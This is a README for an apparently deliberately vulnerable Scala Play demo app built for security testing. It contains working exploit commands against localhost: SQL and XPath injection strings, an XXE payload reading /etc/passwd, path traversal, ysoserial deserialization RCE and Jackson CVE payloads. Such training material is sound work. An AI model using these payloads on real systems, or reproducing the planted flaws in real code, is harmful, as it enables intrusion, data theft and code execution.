# Package

```
$ sbt stage
$ file ./target/helloshiftleft-play-jpa-scala-0.0.1-SNAPSHOT.jar
```

# Run

```
$ sbt run
```

# Http routes

See routes at [config/routes](config/routes).

Use `localhost` as host name in the URLs

To interact with the endpoints use `curl` (or any other tool)

+ GET /account
+ GET /createCustomer
+ POST /account `curl localhost:8082/account -X POST -H "Content-Type: application/json" --data '{ "accountNumber": 1337, "routingNumber": 1222 }'`
+ GET /customers 
+ GET /customersXML


# Package standalone (not officially supported by Play)

```
$ sbt assembly
$ java -Dplay.server.http.port="8082" -Dplay.server.http.address="127.0.0.1" -jar ./target/helloshiftleft-play-jpa-scala-assembly-0.0.1-SNAPSHOT.jar
```

# Vulnerability coverage table

The following table shows vulns category implemented in HSL grouped according to OWASP standards.

| OWASP category              | Vuln description                                  |
| ----------------------------|-------------------------------------------------- |
| A1-Injection                | Sql Injection                                     |
| A2-Broken Auth              | missing HttpOnly Cookie                           |
| A3-Sensitive Data Exposure  | Weak crypto, clear text storage of sensitive data |
| A4-XXE                      | XML XXE attack                                    |
| A5-Broken Access Control    | Path traversal                                    |
| A6-Sec misconfiguration     | not present yet                                   |
| A7-XSS                      | reflected XSS attack                              |
| A8-Insecure deserialization | Java deserialization attacks                      |
| A9-Known Vulnerabilities    | we use a vulnerable version of jackson            |

# A1 SQL Injection

There are two SQL injection vulns, the first one in `getRawCustomer` and the second in `getRawCustomerByName`.
To exploit it you can interact with the endpoint in this way:

Normal behavior: ```curl "http://localhost:8082/rawcustomersbyname/Joe"```

Exploit: ```curl "http://localhost:8082/rawcustomersbyname/Joe%20'%20or%20'1'='1"```

# A2 missing HttpOnly cookie flag

The endpoint `/admin/login` reachable via POST request, does not set the cookie as HttpOnly.

# A4 XXE

The endpoint `/customersXML` suffers from an XXE vulnerabily.

```
curl  \
  --header "Content-type: application/xml" \
  --request GET \
  --data '<name>Guillaume</name>' \
  http://localhost:8082/customersXML
```

To exploit the XXE modify the payload above with the malicious one below:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<userInfo>
 <firstName>John</firstName>
 <name>&ent;</name>
</userInfo>
```
Then you can use the following `curl` command to trigger the vulnerability:
```
curl -i -s -k  -X $'GET' \
    -H $'Host: localhost:8082' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-GB,en;q=0.5' -H $'Accept-Encoding: gzip;q=0,deflate,sdch' -H $'Content-type: application/xml' -H $'Cookie:' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Length: 168' \
    --data-binary $'<!--?xml version=\"1.0\" ?-->\x0d\x0a<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\x0d\x0a<userInfo>\x0d\x0a <firstName>John</firstName>\x0d\x0a <name>&ent;</name>\x0d\x0a</userInfo>' \
    $'http://localhost:8082/customersXML'
```


As result, the output will contain the passwd file.

# A5 directory traversal

`saveSettings` contains a arbitrary file write vulnerability. The file relative path is extracted from the attacker controllable cookies.
To exploit the vuln use the `filewriteexploit.py` script, as shown below:

```
python dirtraversalexploit.py http://localhost:8082/saveSettings ../../../../../../../tmp/pwn asd
```
The above script will send the payload to the url specified as first argument, the relative path that will be used for the 
directory traversal is passed as second argument.

# A7 XSS

There is a reflected XSS in `/consumers/`. To exploit it visit the `/createConsumer` page and specify any malicious payload in the form.

# A8 Java deserialization 

`/unmarsh` retrives the `lol` parameter from the received POST request, decode64 its values and finally calls `readObject`.
To create the payload run `DoSerializeRCE` and then use its output to build the POST query as following:

```
curl localhost:8082/unmarsh  -X POST --data-urlencode "lol=rO0ABXNyABNEb1NlcmlhbGl6ZVJDRSRFdmlsx/E6K8+e2zIDAAB4cHg="
``` 
```
curl localhost:8082/unmarsh -X POST --data-urlencode "lol=`cat commons5.b64`"
```

```
java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 /usr/bin/xcalc > commons5.bin
base64 commons5.bin | tr -d '\040\011\012\015'> commons5.b64
```

# A9 Jackson

The route `/bean1599` accepts POST operations and deserializes via Jackson the received body data. 
The file `exploit.json` contains the payload for CVE-2017-17485. 
Instead, the file `exploitold.json` provides the payload for CVE-2017-7525.

To run the exploit, first run the server with `sbt run` then type following commands:

```
export payload=`cat exploit.json`
curl localhost:8082/bean1599 -X POST -H "Content-Type: application/json" -d "$payload"
``` 

+ https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/
+ https://github.com/irsl/jackson-rce-via-spel




# XPath injection

After starting the service it is possible to bypass the credential check with this URL: http://localhost:8082/checkAccount/admin/x'%20or%20'1'='1 . This results in the following xpath query: `//user[username/text()='admin' and password/text()='x' or '1'='1']` and the message `Hello admin`.

If you provide wrong credentials the handler returns `Error with your credentials!`. Syntax errors as http://localhost:8082/checkAccount/admin/x' result in the error message `A server error occurred: javax.xml.xpath.XPathExpressionException: javax.xml.transform.TransformerException: misquoted literal... expected single quote!` 


